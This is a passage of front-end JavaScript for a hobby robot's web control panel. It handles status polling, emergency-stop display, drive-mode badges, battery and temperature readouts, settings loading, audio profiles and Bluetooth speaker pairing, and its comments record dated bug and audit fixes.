    const pwdWarn = el('admin-pwd-default-warn');
    if (pwdWarn) {
      if (data.admin_pwd_is_default) pwdWarn.classList.remove('hidden');
      else pwdWarn.classList.add('hidden');
    }

    // Conditional topbar pills — visible only when something is wrong
    const pillSlave = el('pill-slave');
    const slaveOffline = !data.uart_ready || data.uart_health == null;
    if (pillSlave) pillSlave.style.display = slaveOffline ? '' : 'none';

    // E-STOP overlay — sync from server state (survives page reload)
    if (data.estop_active !== undefined && data.estop_active !== _estopTripped)
      _setEstopUI(data.estop_active);

    // Audit reclass R1 2026-05-15: anti-tip ramp visual cue. Toggle
    // body classes so the joystick ring pulses amber during the
    // ~400ms ramp-down — operator sees "robot is stopping safely"
    // instead of "I pressed but nothing happens" silent 503.
    document.body.classList.toggle('drive-ramping', !!data.drive_ramp_active);
    document.body.classList.toggle('dome-ramping',  !!data.dome_ramp_active);

    // WOW polish 2026-05-15 (D1 + D2): persistent mode badges so the
    // operator can never forget which mode is active. Show ONLY when
    // a non-normal mode is active — invisible during normal+safe.
    const strip = el('drive-mode-strip');
    const benchPill = el('mode-bench');
    const kidsPill  = el('mode-kids');
    const lockPill  = el('mode-lock');
    if (strip) {
      const bench = !!data.vesc_bench_mode;
      const kids  = data.lock_mode === 1;
      const lock  = data.lock_mode === 2;
      const anyMode = bench || kids || lock;
      strip.style.display = anyMode ? 'flex' : 'none';
      if (benchPill) benchPill.style.display = bench ? 'inline-flex' : 'none';
      if (kidsPill)  kidsPill.style.display  = kids  ? 'inline-flex' : 'none';
      if (lockPill)  lockPill.style.display  = lock  ? 'inline-flex' : 'none';
      if (kids && data.kids_speed_limit !== undefined) {
        const pct = Math.round((data.kids_speed_limit ?? 0.5) * 100);
        const pctEl = el('mode-kids-pct');
        if (pctEl) pctEl.textContent = pct;
      }
      // W6 fix 2026-05-16: quick-exit CTA visible only when locked.
      const unlockCta = el('mode-unlock-cta');
      if (unlockCta) unlockCta.style.display = (kids || lock) ? 'inline-flex' : 'none';
      // W16 fix 2026-05-16: refresh the kids-timed-out dot every poll
      // (it's wall-clock-derived; needs periodic re-eval to flip on).
      if (kids && typeof lockMgr !== 'undefined' && lockMgr._updateDriveLockLabel) {
        lockMgr._updateDriveLockLabel();
      }
    }

    // Audit finding Safety L-5 2026-05-15: surface stow_in_progress
    // on the E-STOP button text. While the safe-home is mid-stow,
    // the button shows STOWING… so the operator doesn't think reset
    // succeeded fully and try to drive (which 503s during stow).
    //
    // Bug H3 fix 2026-05-15: also fire the 'Ready' toast on the
    // stow_in_progress:true→false transition (was in the old 500ms
    // _stowWatch loop which we removed to avoid the race).
    const estopTxt = el('estop-toggle-text');
    if (estopTxt) {
      if (data.stow_in_progress) {
        estopTxt.textContent = 'STOWING…';
      } else if (estopTxt.textContent === 'STOWING…' && !data.estop_active) {
        // 2026-05-16 user-reported fix: was gating on local _estopTripped
        // which can desync with the server (poll missed, reload race).
        // Use server-authoritative data.estop_active instead — if server
        // says estop is NOT active AND stow is NOT in progress, text
        // CANNOT legitimately be 'STOWING…' regardless of local cache.
        estopTxt.textContent = 'EMERGENCY STOP';
      }
    }
    // Edge-triggered ready toast (only on true→false transition).
    if (this._lastStowing === true && data.stow_in_progress === false && !_estopTripped) {
      const name = (data.robot_name && data.robot_name.trim()) || 'Robot';
      toast(`${name} ready — drive armed`, 'ok');
    }
    this._lastStowing = !!data.stow_in_progress;

    // WOW HW1 2026-05-15: sync the speed-effective hint with the
    // current VESC power_scale from /status.
    if (typeof data.power_scale === 'number' && data.power_scale !== _powerScaleCached) {
      _powerScaleCached = data.power_scale;
      if (typeof _updateSpeedEffective === 'function') _updateSpeedEffective();
    }

    // WOW L1-W 2026-05-15: ALIVE button title shows next-idle countdown
    // so operator hovering/long-pressing sees 'Next reaction in 2:34'.
    const aliveBtn = el('alive-toggle-btn');
    if (aliveBtn) {
      if (data.alive_enabled === false) {
        aliveBtn.title = 'ALIVE mode OFF — click to enable idle reactions';
      } else if (data.next_idle_in_s != null && data.next_idle_in_s > 0) {
        const s = Math.floor(data.next_idle_in_s);
        const m = Math.floor(s / 60), sec = s % 60;
        aliveBtn.title = `ALIVE mode ON — next reaction in ${m}:${String(sec).padStart(2, '0')}`;
      } else {
        aliveBtn.title = 'ALIVE mode — idle reactions';
      }
    }

    // WOW HW3 2026-05-15: BT controller status pill on Drive bottom.
    // Shown only when a controller is paired+connected. Edge-trigger
    // toast on disconnect so operator knows mid-show.
    const btPill = el('drive-bt-pill');
    const btBars = el('drive-bt-bars');
    const btConnected = !!data.bt_connected;
    if (btPill) btPill.style.display = btConnected ? 'inline-flex' : 'none';
    if (btConnected && btBars) {
      const rssi = data.bt_rssi;
      const lit = (typeof rssi === 'number')
        ? (rssi >= -55 ? 4 : rssi >= -65 ? 3 : rssi >= -75 ? 2 : 1)
        : 0;
      const cls = (typeof rssi === 'number')
        ? (rssi >= -65 ? '' : rssi >= -75 ? 'weak' : 'bad')
        : '';
      btBars.replaceChildren();
      for (let i = 1; i <= 4; i++) {
        const b = document.createElement('span');
        b.className = `signal-bar signal-bar-${i} ${i <= lit ? 'lit ' + cls : ''}`;
        btBars.appendChild(b);
      }
      if (btPill) btPill.title = `Bluetooth controller · ${rssi ?? '?'} dBm`;
    }
    if (this._lastBtConnected === true && !btConnected) {
      toast('🎮 BT controller disconnected', 'warn');
    }
    this._lastBtConnected = btConnected;

    // Drive-tab shortcut indicators — turn buttons green while the
    // matching choreo/sound is actually playing, revert when done.
    // User-reported 2026-05-15: 'il faudrait au moins avoir un
    // indicateur ... savoir qu'il est toujours en train de jouer'.
    this._lastData = data;
    if (typeof shortcutsRunner !== 'undefined') shortcutsRunner.updateFromStatus(data);

    // Choreo motion lockout — per axis. A panel/sound-only choreo
    // leaves both joysticks free; a 'propulsion' track locks left;
    // a 'dome' track locks right horizontal. BT gamepad applies the
    // same per-axis filter server-side. Resumes immediately when
    // the matching track stops.
    const wantProp = !!(data.choreo_playing && data.choreo_uses_propulsion);
    const wantDome = !!(data.choreo_playing && data.choreo_uses_dome);
    if (wantProp !== _choreoPropLocked || wantDome !== _choreoDomeLocked) {
      _setChoreoLockUI(wantProp, wantDome, data.choreo_name);
    } else if ((wantProp || wantDome) && data.choreo_name) {
      const lbl = el('choreo-lock-label');
      if (lbl && lbl.textContent !== data.choreo_name) lbl.textContent = data.choreo_name;
    }

    // E10 fix 2026-05-16: per-axis Lights tab lockout. Operator clicking
    // an animation chip during a lights-using choreo races UART writes
    // with the choreo's lights events → flicker / wrong final state.
    // Body class greys out chips via CSS .choreo-lights-locked rule.
    const wantLights = !!(data.choreo_playing && data.choreo_uses_lights);
    if (wantLights !== document.body.classList.contains('choreo-lights-locked')) {
      document.body.classList.toggle('choreo-lights-locked', wantLights);
    }

    // B4/B5/E3 + W1/W2 fix 2026-05-16: sync Lights chip + RANDOM/OFF
    // buttons from authoritative backend state. Without this, the UI
    // lies after page reload OR after any animation/text/raw click
    // OR if a choreo changed lights state.
    if (typeof teecesController !== 'undefined' && teecesController.syncFromStatus) {
      teecesController.syncFromStatus(data.teeces_mode);
    }

    // Cockpit pills — always updated (panel may be closed)
    this._setCockpitHbPill(data.heartbeat_ok);
    this._setCockpitUartPill(data.uart_ready, data.uart_health, data.uart_crc_errors ?? 0);

    const sysver = el('system-version');
    if (sysver) sysver.textContent =
      `Master: v${data.version || '?'}  |  Uptime: ${data.uptime || '--'}`;

    // Robot name — update header and pre-fill settings input
    if (data.robot_name) {
      // S11 fix 2026-05-16: cache for the per-robot localStorage
      // namespacing helpers (_lsKey/_lsGet/_lsSet).
      _setCachedRobotName(data.robot_name);
      const headerName = el('header-robot-name');
      if (headerName) headerName.textContent = data.robot_name;
      const nameInput = el('robot-name-input');
      if (nameInput && !nameInput.matches(':focus')) nameInput.value = data.robot_name;
      // 2026-05-15: sync any <span class="robot-name"> in static body
      // copy (settings notes, warnings) to the operator-configured
      // name so 'R2-D2 cannot turn' becomes '<their name> cannot turn'.
      document.querySelectorAll('.robot-name').forEach(s => {
        if (s.id !== 'header-robot-name' && s.textContent !== data.robot_name) {
          s.textContent = data.robot_name;
        }
      });
    }

    // Location names — Dome/Body can be renamed per robot
    if (data.master_location || data.slave_location) {
      _applyLocationLabels(data.master_location || 'Dome', data.slave_location || 'Body');
    }

    // Robot icon — update header icon wrap + highlight selected picker btn
    if (data.robot_icon !== undefined) _applyRobotIcon(data.robot_icon);

    // Battery gauge — also clear on null so a disconnected VESC drops
    // the arc back to grey instead of holding the last reading.
    if (data.battery_voltage != null) batteryGauge.update(data.battery_voltage);
    else                              batteryGauge.update(null);

    // Drive tab VESC stats (voltage + VESC temp). Show '--' on null so a
    // VESC disconnect immediately reflects in the top bar instead of the
    // user staring at the last-good reading thinking the VESC is still up.
    const sv = el('drive-stat-v');
    const st = el('drive-stat-t');
    if (sv) sv.textContent = data.battery_voltage != null
      ? data.battery_voltage.toFixed(1) + 'V'
      : '--V';
    if (st) {
      if (data.vesc_temp != null) {
        // WOW polish D4 2026-05-15: thermometer icon for proactive
        // thermal awareness. Glyph swaps based on threshold so
        // operator sees "🌡 65°C" not just "65°C" — easier to spot
        // a warning in peripheral vision.
        const t = data.vesc_temp;
        const icon = t < 50 ? '' : (t < 70 ? '🌡 ' : '🔥 ');
        st.textContent = icon + t.toFixed(0) + '°C';
        st.style.color = t < 50 ? 'var(--text-dim)' : t < 70 ? 'var(--orange)' : 'var(--red)';
      } else {
        st.textContent = '--°C';
        st.style.color = 'var(--text-dim)';
      }
    }

    // Temperature
    if (data.temperature != null) {
      const temp = data.temperature;
      const tempLabel = el('temp-label');
      if (tempLabel) tempLabel.textContent = temp + '°C';
      const tempDrive = el('temp-val-drive');
      if (tempDrive) tempDrive.textContent = temp + '°C';
      const fill = el('temp-bar-fill');
      if (fill) {
        const pct = Math.min(100, temp);
        fill.style.height = pct + '%';
        fill.style.background = temp < 60 ? '#00cc66' : temp < 75 ? '#ff8800' : '#ff2244';
      }
      const tempHeader = el('temp-label');
      if (tempHeader) {
        tempHeader.textContent = temp + '°C';
        tempHeader.style.color = temp < 60 ? '#00cc66' : temp < 75 ? '#ff8800' : '#ff2244';
      }
    }

    // BT controller status
    btController.updateStatus(data);

    // Audio state
    if (data.audio_playing !== undefined) {
      audioBoard.setPlaying(data.audio_playing, data.audio_current || '');
    }

    // Update sequences running state from choreo status
    if (data.choreo_playing !== undefined) {
      const running = (data.choreo_playing && data.choreo_name)
        ? [{ name: data.choreo_name, id: 'choreo' }]
        : [];
      scriptEngine.updateRunning(running);
    }

    // Bug B3 fix 2026-05-15: surface choreo abort globally so an
    // undervoltage/overheat/uart_loss abort fires a toast no matter
    // which tab the operator is on.
    //
    // BUG fix 2026-05-15 (post B3): only toast on REAL mid-flight
    // abort transitions — playing=true → playing=false WITH a reason.
    // Previously firing on any non-null abort_reason caused a false
    // toast at page load when a STALE reason was still in /status
    // from a previous rejected play (user-reported 'bizarre un banner
    // a apparue dans choreo disant que emergency était activer').
    //
    // The first poll initializes the baseline silently; subsequent
    // polls compare against it. Reasons like estop_active /
    // stow_in_progress that come from pre-flight rejection (operator
    // already saw the toast from the API failure) are explicitly
    // ignored — only TRUE in-flight aborts surface here.
    const _newAbort   = data.choreo_abort_reason || null;
    const _newPlaying = !!data.choreo_playing;
    const _IGNORE = new Set(['estop_active', 'stow_in_progress']);
    if (this._lastPlaying === true && _newPlaying === false
        && _newAbort && !_IGNORE.has(_newAbort)) {
      const labels = {
        uart_loss:    'UART LOSS',
        undervoltage: 'BATTERY UNDERVOLTAGE',
        overheat:     'VESC OVERHEAT',
        overcurrent:  'VESC OVERCURRENT',
      };
      toast(`⚠ Choreo aborted — ${labels[_newAbort] || _newAbort.toUpperCase()}`, 'error');
    }
    this._lastAbortReason = _newAbort;
    this._lastPlaying     = _newPlaying;

    // Lock mode — sync si reconnexion ou autre client
    if (data.lock_mode !== undefined) {
      lockMgr.syncFromStatus(data.lock_mode);
    }

    // VESC safety lock
    _applyVescSafetyLock(
      data.vesc_drive_safe !== false,
      data.vesc_l_ok !== false,
      data.vesc_r_ok !== false,
    );

    // Teeces / lights state — _applyFLDMode was removed in Lights B3
    // refactor (FLD/PSI buttons replaced by ANIMATIONS) but this caller
    // was left behind → threw TypeError on every poll, which killed
    // updateBtn(data) and cockpitPanel.update(data) below. Bug found
    // when STATUS pill stayed green with bench_mode ON until clicked.
    if (data.teeces_mode && typeof teecesController._applyFLDMode === 'function') {
      teecesController._applyFLDMode(data.teeces_mode);
    }
    if (data.lights_backend) {
      teecesController.updateCardTitle(data.lights_backend);
      if (_lightsBackend !== data.lights_backend) {
        _lightsBackend = data.lights_backend;
        _updateRawPaletteItem();
      }
    }

    // Always update cockpit button color; also refresh panel content if open
    cockpitPanel.updateBtn(data);
    if (cockpitPanel.isOpen) cockpitPanel.update(data);

    // BT Gamepad panel: auto-refresh custom mappings UI when the active
    // device MAC changes (controller paired/unpaired/reconnected) AND the
    // panel is visible. Without this, pairing a new controller while the
    // BT panel is open shows 'no controller paired yet' until manual reload.
    try {
      const btPanel = el('spanel-bluetooth');
      if (btPanel && btPanel.classList.contains('active') &&
          typeof btCustomMappings !== 'undefined') {
        const curMac = data.active_device_mac || null;
        if (this._lastBtMac !== curMac) {
          this._lastBtMac = curMac;
          btCustomMappings.load();
        }
      }
    } catch {}

    // VESC tab has its own 500ms poll via _startVescTabPoll() — no refresh needed here
  }

  _setOffline(offline) {
    const wasOffline = this._offline;
    this._offline = offline;
    const pillOffline = el('pill-offline');
    if (pillOffline) pillOffline.style.display = offline ? '' : 'none';
    const pillSlave = el('pill-slave');
    if (pillSlave && offline) pillSlave.style.display = 'none';
    // Reload data when coming back online
    if (wasOffline && !offline) {
      audioBoard.loadCategories();
      scriptEngine.load();
      loadServoSettings();
      // LOW-3 cleanup 2026-05-16 (review iter 2): reset BT MAC tracking
      // so the next /status poll triggers a fresh load when the BT panel
      // is visible. Without this, _lastBtMac kept its pre-downtime value
      // and the auto-refresh hook didn't fire even though the controller
      // may have reconnected during downtime.
      this._lastBtMac = undefined;
      try {
        const btPanel = el('spanel-bluetooth');
        if (btPanel && btPanel.classList.contains('active') &&
            typeof btCustomMappings !== 'undefined') {
          btCustomMappings.load();
        }
      } catch {}
    }
  }

  _setCockpitHbPill(heartbeatOk) {
    const p = el('ck-pill-hb');
    if (!p) return;
    p.className = 'status-pill ' + (heartbeatOk ? 'ok' : 'error');
    p.title     = heartbeatOk
      ? 'App heartbeat OK — browser ↔ Master'
      : 'App heartbeat lost — browser stopped pinging Master (app watchdog will fire). UART HB Master ↔ Slave is shown separately.';
    for (const node of p.childNodes)
      if (node.nodeType === Node.TEXT_NODE) node.textContent = 'APP HB';
  }

  _setCockpitUartPill(uartReady, health, masterCrcErrors) {
    const p = el('ck-pill-uart');
    if (!p) return;
    const dot = p.querySelector('.pulse-dot');
    let cls, label, tooltip;
    if (!uartReady) {
      cls     = 'status-pill error';
      label   = 'UART';
      tooltip = 'Serial port not open';
    } else if (health == null) {
      cls     = masterCrcErrors > 0 ? 'status-pill error' : 'status-pill warn';
      label   = 'UART';
      tooltip = masterCrcErrors > 0
        ? `Slave unreachable | Master invalid CRC: ${masterCrcErrors}`
        : 'Slave unreachable';
    } else {
      const pct = health.health_pct;
      if      (pct >= 95) cls = 'status-pill ok';
      else if (pct >= 70) cls = 'status-pill warn';
      else                cls = 'status-pill error';
      label   = 'UART ' + pct.toFixed(0) + '%';
      tooltip = `${health.errors} errors / ${health.total} msg (${health.window_s}s)`
              + (masterCrcErrors > 0 ? ` | Master invalid CRC: ${masterCrcErrors}` : '');
    }
    p.className = cls;
    p.title     = tooltip;
    for (const node of p.childNodes)
      if (node.nodeType === Node.TEXT_NODE) node.textContent = label;
  }

  _setPill(id, ok, label) {
    const p = el(id);
    if (!p) return;
    const dot = p.querySelector('.pulse-dot');
    const cls = 'status-pill ' + (ok ? 'ok' : 'error');
    p.className = cls;
    // label text node — update the text without removing the dot
    if (dot) {
      // Only update text nodes
      for (const node of p.childNodes) {
        if (node.nodeType === Node.TEXT_NODE) {
          node.textContent = label;
        }
      }
    } else {
      p.textContent = label;
    }
  }
}

const poller = new StatusPoller();

// Called by MainActivity.kt (Android) when R2D2_API_BASE is updated
// and the server becomes reachable — reloads all dynamic data
function pollStatus() {
  audioBoard.loadCategories();
  scriptEngine.load();
  loadServoSettings();
  poller.poll();
}

// ================================================================
// Clock
// ================================================================

function updateClock() {
  const c = el('clock-label');
  if (!c) return;
  const now = new Date();
  const h = String(now.getHours()).padStart(2, '0');
  const m = String(now.getMinutes()).padStart(2, '0');
  const s = String(now.getSeconds()).padStart(2, '0');
  c.textContent = `${h}:${m}:${s}`;
}

// ================================================================
// Settings
// ================================================================

let _audioChannelsConfig = 6;  // loaded from GET /settings, used by CHOREO validation

async function loadSettings() {
  const data = await api('/settings');
  if (!data) return;

  if (data.wifi) {
    const ssid = el('wifi-ssid');
    if (ssid) ssid.value = data.wifi.ssid || '';
    // E13 fix 2026-05-16: cache for no-op skip in applyWifi
    window._loadedWifiSsid = data.wifi.ssid || '';
    const status = el('wifi-status');
    if (status) {
      if (data.wifi.connected) {
        status.textContent = `Connected | SSID: ${data.wifi.ssid || data.wifi.connection} | IP: ${data.wifi.ip}`;
        status.className = 'settings-status ok';
      } else {
        status.textContent = 'Not connected — wlan1 absent or Master hotspot not available';
        status.className = 'settings-status error';
      }
    }
  }

  if (data.hotspot) {
    const ssid = el('hotspot-ssid');
    if (ssid) ssid.value = data.hotspot.ssid || '';
    window._loadedHotspotSsid = data.hotspot.ssid || '';
    const status = el('hotspot-status');
    if (status) {
      status.textContent = data.hotspot.active
        ? `Active | SSID: ${data.hotspot.ssid} | IP: ${data.hotspot.ip}`
        : 'Hotspot inactive';
      status.className = 'settings-status ' + (data.hotspot.active ? 'ok' : 'error');
    }
  }

  if (data.github) {
    const repoUrl = el('repo-url');
    if (repoUrl) repoUrl.value = data.github.repo_url || '';
    const branch = el('git-branch');
    if (branch) branch.value = data.github.branch || 'main';
    const autoPull = el('auto-pull');
    if (autoPull) autoPull.checked = data.github.auto_pull_on_boot;
  }

  if (data.slave) {
    const host = el('slave-host');
    if (host) host.value = data.slave.host || 'r2-slave.local';
  }

  // B-74: capture baseline AFTER all inputs are populated so saveConfig
  // can diff against it. Values match the exact strings POSTed.
  _deployCfgBaseline = {
    'github.repo_url':          (el('repo-url')?.value || '').trim(),
    'github.branch':            (el('git-branch')?.value || '').trim(),
    'github.auto_pull_on_boot': el('auto-pull')?.checked ? 'true' : 'false',
    'slave.host':               (el('slave-host')?.value || '').trim(),
  };

  if (data.hardware) {
    const mh = el('master-hats-input');
    if (mh) mh.value = data.hardware.master_hats || '0x40';
    const sh = el('slave-hats-input');
    if (sh) sh.value = data.hardware.slave_hats || '0x41';
    const smh = el('slave-motor-hat-input');
    if (smh) smh.value = data.hardware.slave_motor_hat || '0x40';
    const lat = el('body-uart-lat-input');
    if (lat) lat.value = data.hardware.body_uart_lat_ms ?? 25;
    // Snapshot of loaded values — saveHardwareConfig() compares against these
    // to send ONLY the fields the user actually changed (avoids needlessly
    // restarting the Slave when only the UART latency was tweaked).
    _hardwareLoaded = {
      master_hats:     data.hardware.master_hats     || '0x40',
      slave_hats:      data.hardware.slave_hats      || '0x41',
      slave_motor_hat: data.hardware.slave_motor_hat || '0x40',
      body_uart_lat_ms: data.hardware.body_uart_lat_ms ?? 25,
    };
    // W1+W2 fix 2026-05-16: render meta immediately after populating
    // inputs so operator sees the live HAT health + servo count on
    // first panel visit (not just after typing).
    try {
      validateHatField('master-hats-input');
      validateHatField('slave-hats-input');
      validateHatField('slave-motor-hat-input', true);
    } catch {}
  }

  if (data.lights) {
    const sel = el('lights-backend');
    if (sel) sel.value = data.lights.backend || 'teeces';
  }

  if (data.audio) {
    const inp = el('audio-channels');
    if (inp) inp.value = data.audio.channels ?? 6;
    _audioChannelsConfig = data.audio.channels ?? 6;
    soundProfiles.populate(data.audio.profiles);
  }

  if (data.battery) {
    const cells = data.battery.cells ?? 4;
    const chem  = (data.battery.chemistry || 'liion').toLowerCase();
    const sel = el('battery-cells');
    if (sel) sel.value = String(cells);
    const chemSel = el('battery-chemistry');
    if (chemSel) {
      chemSel.value = chem;
      // B3 fix 2026-05-16: if backend stores 'lipo' but dropdown has
      // no matching option, select silently fallbacks to first → next
      // save destructively overwrites. Detect mismatch + force liion.
      if (chemSel.value !== chem) {
        chemSel.value = 'liion';
        console.warn(`Battery chemistry '${chem}' not in dropdown — UI showing liion`);
      }
    }
    // W4: pass chemistry so LiFePO4 packs get correct thresholds
    batteryGauge.setCells(cells, chem);
    // B5 fix 2026-05-16: render preview immediately on first load
    // (was: preview empty until operator wiggled a dropdown).
    if (typeof updateBatteryPreview === 'function') updateBatteryPreview();
  }
}

async function saveLightsBackend() {
  const backend = el('lights-backend')?.value;
  if (!backend) return;
  const status = el('lights-status');
  // WOW polish 2026-05-15: H-5 race protection — disable the dropdown
  // and button during the swap so a double-click can't race the
  // driver re-init. Released in finally on both paths.
  const dropdown = el('lights-backend');
  const btn = document.querySelector('#spanel-lights button[onclick*="saveLightsBackend"]');
  if (dropdown) dropdown.disabled = true;
  try {
    await withSaveFeedback(btn, async () => {
      const data = await api('/settings/lights', 'POST', { backend });
      if (!data || data.status !== 'ok') {
        throw new Error(data?.error || 'failed');
      }
      toast(data.message || `Lights driver: ${backend}`, 'ok');
      if (status) {
        status.textContent = `Driver: ${backend} (reloaded just now)`;
        status.className = 'settings-status ok';
      }
      // E1 fix 2026-05-16: backend switch changes the ANIMATIONS dict
      // (AstroPixels exposes 8 codes vs Teeces 22). Invalidate the
      // session cache + clear the grid so next Lights-tab visit
      // rebuilds with the right chips.
      _lightsAnimDataCache = null;
      const grid = el('anim-grid');
      if (grid) grid.innerHTML = '';
      return data;
    });
  } catch (e) {
    toast(e.message || 'Hot-reload failed', 'error');
    if (status) { status.textContent = e.message || 'Error'; status.className = 'settings-status error'; }
  } finally {
    if (dropdown) dropdown.disabled = false;
  }
}

async function saveAudioChannels() {
  const channels = parseInt(el('audio-channels')?.value) || 6;
  if (channels < 1 || channels > 12) { toast('Channels must be between 1 and 12', 'error'); return; }
  const status = el('audio-channels-status');
  if (status) { status.textContent = 'Applying…'; status.className = 'settings-status'; }
  const data = await api('/settings/config', 'POST', { 'audio.channels': channels });
  if (!data || data.status !== 'ok') {
    toast('Failed to update audio channels', 'error');
    if (status) { status.textContent = 'Error'; status.className = 'settings-status error'; }
    return;
  }
  _audioChannelsConfig = channels;
  toast(`Audio channels: ${channels} — services restarting`, 'ok');
  // WOW polish M4 2026-05-15: live countdown so operator sees the
  // service restart progress instead of staring at a frozen
  // 'reconnecting in ~5s…' string for 5 seconds. Replaces the
  // dying static text with a live ticking number that lands on
  // '✓ ready' or 'still reconnecting…' based on /audio/health.
  if (!status) return;
  let remaining = 5;
  status.className = 'settings-status';
  status.textContent = `Set to ${channels} — reconnecting in ${remaining}s…`;
  const tick = setInterval(() => {
    remaining--;
    if (remaining > 0) {
      status.textContent = `Set to ${channels} — reconnecting in ${remaining}s…`;
    } else {
      clearInterval(tick);
      status.textContent = `Set to ${channels} — verifying…`;
      // Verify the audio service responded by hitting /status
      api('/status').then(r => {
        if (r) {
          status.textContent = `✓ Audio: ${channels} channels ready`;
          status.className = 'settings-status ok';
        } else {
          status.textContent = `Set to ${channels} — still reconnecting…`;
          status.className = 'settings-status';
        }
      }).catch(() => {
        status.textContent = `Set to ${channels} — still reconnecting…`;
      });
    }
  }, 1000);
}

// ─── Sound Profiles ───────────────────────────────────────────────────────────
const soundProfiles = {
  _NAMES: ['convention', 'maison', 'exterieur'],
  _saved: {},   // L2-W: last-saved values per profile, for dirty-check

  async load() {
    try {
      const d = await api('/settings');
      if (d?.audio) this.populate(d.audio.profiles);
    } catch(e) {}
  },

  populate(profiles) {
    const defaults = { convention: 70, maison: 85, exterieur: 95 };
    for (const name of this._NAMES) {
      const vol = profiles?.[name] ?? defaults[name];
      this._saved[name] = vol;
      const slider = el(`profile-${name}-vol`);
      const label  = el(`profile-${name}-val`);
      if (slider) {
        slider.value = vol;
        syncHoloSlider(slider);
        // L2-W fix 2026-05-15: wire dirty-check on input. Operator
        // dragging a profile slider sees the row glow amber until
        // SAVE persists. Prevents 'I changed it but forgot to save'.
        if (!slider.dataset.dirtyWired) {
          slider.dataset.dirtyWired = '1';
          slider.addEventListener('input', () => this.checkDirty(name));
        }
      }
      if (label)  { label.textContent = vol + '%'; }
      this.checkDirty(name);
    }
  },

  checkDirty(name) {
    const slider = el(`profile-${name}-vol`);
    const row    = slider?.closest('.profile-row');
    if (!row) return;
    const cur = parseInt(slider.value, 10);
    const dirty = (cur !== this._saved[name]);
    row.classList.toggle('profile-dirty', dirty);
  },

  async save(name) {
    // B-121 (audit 2026-05-15): `|| 80` swallowed a legitimate vol=0
    // (mute profile) and silently stored 80%. parseInt+Number.isFinite
    // accepts 0 while still rejecting NaN from a blank input.
    const raw = parseInt(el(`profile-${name}-vol`)?.value);
    const vol = Number.isFinite(raw) ? Math.max(0, Math.min(100, raw)) : 80;
    const status = el('audio-profiles-status');
    if (status) { status.textContent = 'Saving…'; status.className = 'settings-status'; }
    const d = await api('/settings/config', 'POST', { [`audio.profile_${name}`]: vol });
    if (d?.status === 'ok') {
      this._saved[name] = vol;       // L2-W: persist baseline
      this.checkDirty(name);          // clears the dirty class
      toast(`Profile ${name}: ${vol}% saved`, 'ok');
      if (status) { status.textContent = `${name}: ${vol}% saved`; status.className = 'settings-status ok'; }
    } else {
      toast('Failed to save profile', 'error');
      if (status) { status.textContent = 'Error'; status.className = 'settings-status error'; }
    }
  },

  async apply(name) {
    await this.save(name);
    const d = await api('/settings/audio/profile/apply', 'POST', { profile: name });
    if (d?.status === 'ok') {
      const vol = d.volume;
      const mainSlider = el('volume-slider');
      const mainLabel  = el('volume-label');
      if (mainSlider) { mainSlider.value = vol; }
      if (mainLabel)  { mainLabel.textContent = vol + '%'; }
      toast(`${name.charAt(0).toUpperCase() + name.slice(1)}: ${vol}% applied`, 'ok');
    }
  },
};

// ─── BT Speaker ───────────────────────────────────────────────────────────────
const btSpeaker = {
  _pollTimer: null,

  scan() {
    const btn = el('btspk-scan-btn');
    if (btn) btn.disabled = true;
    api('/audio/bt/scan', 'POST').then(d => {
      if (!d) { if (btn) btn.disabled = false; return; }
      const badge = el('btspk-scanning');
      if (badge) badge.style.display = '';
      let ticks = 0;
      if (this._pollTimer) clearInterval(this._pollTimer);
      this._pollTimer = setInterval(() => {
        this.refresh();
        if (++ticks >= 5) {
          clearInterval(this._pollTimer);
          this._pollTimer = null;
          if (badge) badge.style.display = 'none';
          if (btn) btn.disabled = false;
        }
      }, 2000);
    }).catch(() => { if (btn) btn.disabled = false; });
  },

  refresh() {
    api('/audio/bt/status').then(d => { if (d) this._render(d); }).catch(() => {});
  },

  _render(d) {
    const connected = (d.paired || []).find(p => p.connected);
    // E18 fix 2026-05-16: edge-trigger toast on connect/disconnect.
    // Operator at a show needs to know mid-set if the BT speaker
    // drops (audio silently falls back to the Pi's jack output).
    const wasConnected = !!this._lastConnected;
    const isConnected  = !!connected;
    if (wasConnected && !isConnected) {
      toast('🔇 BT speaker disconnected — audio on Pi jack', 'warn');
    } else if (!wasConnected && isConnected && this._lastConnected !== undefined) {
      // Skip the very first refresh (undefined → set) so the operator
      // doesn't get a 'connected' toast on every page load.
      toast(`🔊 BT speaker connected: ${connected.name}`, 'ok');
    }
    this._lastConnected = isConnected;
    const icon = el('btspk-icon');
    const text = el('btspk-status-text');
    if (icon) icon.textContent = connected ? '🔊' : '🔇';
    if (text) text.textContent = connected ? `CONNECTED: ${connected.name}` : 'NOT CONNECTED';
    if (d.scanning) { const b = el('btspk-scanning'); if (b) b.style.display = ''; }

    // Show/hide volume slider depending on connection state
    const volRow = el('btspk-vol-row');
    if (volRow) volRow.style.display = connected ? 'flex' : 'none';

    // B-43: _row now returns DOM nodes (not HTML strings) so dev.mac /
    // dev.name never enter an interpolation context. Append them.
    const list = el('btspk-device-list');
    if (!list) return;
    list.replaceChildren();
    let any = false;
    for (const dev of (d.paired || []))     { list.appendChild(this._row(dev, true));  any = true; }
    for (const dev of (d.discovered || [])) { list.appendChild(this._row(dev, false)); any = true; }
    if (!any) {
      const empty = document.createElement('div');
      empty.style.cssText = 'color:var(--txt-dim);font-size:11px;padding:4px 0';
      empty.textContent = '— No devices —';
      list.appendChild(empty);
    }
  },

  _row(dev, isPaired) {
    // B-43 (audit 2026-05-15): build the row via DOM so dev.mac and
    // dev.name never reach an inline-onclick interpolation (escapeHtml
    // doesn't escape `'`, so a crafted MAC with a quote breaks out).
    // The row is returned as outerHTML for the caller's join() but we
    // attach listeners directly to the in-progress DOM nodes BEFORE
    // serialising — actually we can't, because the caller does
    // .innerHTML = '<rows>'. Switch the caller to appendChild too.
    const row = document.createElement('div');
    row.className = 'bt-pair-row';
    if (dev.connected) {
      const dot = document.createElement('span');
      dot.style.cssText = 'color:#5cb85c;font-size:10px';
      dot.textContent = '● ';
      row.appendChild(dot);
    }
    const nameSpan = document.createElement('span');
    nameSpan.className = 'bt-pair-name';
    nameSpan.textContent = dev.name || dev.mac || '';
    row.appendChild(nameSpan);
    const macSpan = document.createElement('span');
    macSpan.className = 'bt-pair-addr';
    macSpan.textContent = dev.mac || '';
    row.appendChild(macSpan);
    const btnWrap = document.createElement('div');
    btnWrap.style.cssText = 'display:flex;gap:4px;margin-left:auto';
    const mkBtn = (cls, txt, endpoint) => {
      const b = document.createElement('button');
      b.className = cls;
      b.textContent = txt;
      b.dataset.mac = dev.mac || '';
      b.addEventListener('click', () => this._act(endpoint, b.dataset.mac));
      return b;
    };
    if (!isPaired)
